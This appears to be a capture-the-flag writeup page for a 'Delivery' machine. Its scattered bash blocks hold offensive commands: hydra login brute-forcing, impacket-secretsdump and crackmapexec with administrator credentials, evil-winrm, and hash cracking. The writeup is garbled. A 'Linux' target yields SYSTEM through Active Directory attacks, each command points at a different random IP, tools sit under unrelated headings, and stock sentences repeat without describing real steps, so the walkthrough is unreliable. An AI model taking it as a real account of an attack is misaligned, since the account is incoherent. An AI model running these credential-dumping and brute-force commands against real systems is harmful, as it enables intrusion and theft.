---
TitleSEO: "VulnHub — Delivery (Insane Linux) | ZureFX"
TitlePost: "VulnHub — Delivery (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Delivery. Silver Ticket and AS-REP Roasting to achieve insane compromise on Linux."
Keywords: "ctf, forensics, pwntilldawn, web"
URL: "https://zurefx.github.io/writeups/htb-delivery-381.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-delivery-381/"
Date: "2024-02-16"
Tags: "CTF, Forensics, PwnTillDawn, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-delivery-381"
Permalink: "/writeups/htb-delivery-381.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Delivery** is rated **Insane** on VulnHub. It runs **Linux** and the IP address during this analysis was `10.57.166.181`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.82.109.217 -u administrator -p 'P@ssw0rd!'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

### Service Enumeration

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.94.236.25/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.61.210.155 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5432,443,389 10.102.151.186 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.91.10
```

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

### Web Enumeration

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```bash
gobuster dir -u http://10.121.74.204/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.205.97
nmap -sCV -p23,110,25 10.12.160.49 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.22.211.32 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

## Exploitation

### Vulnerability Identification

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **Silver Ticket**.

The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
nmap -sCV -p636,445,23 10.82.188.198 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.39.231.202
```

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.88.125.220/FUZZ
gobuster dir -u http://10.81.218.132/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.14.140.22 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.45.217.35 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `sharphound`
- `sqlmap`
- `dcomexec`
- `msfvenom`

### Key Takeaways

- Silver Ticket
- AS-REP Roasting
- SSTI
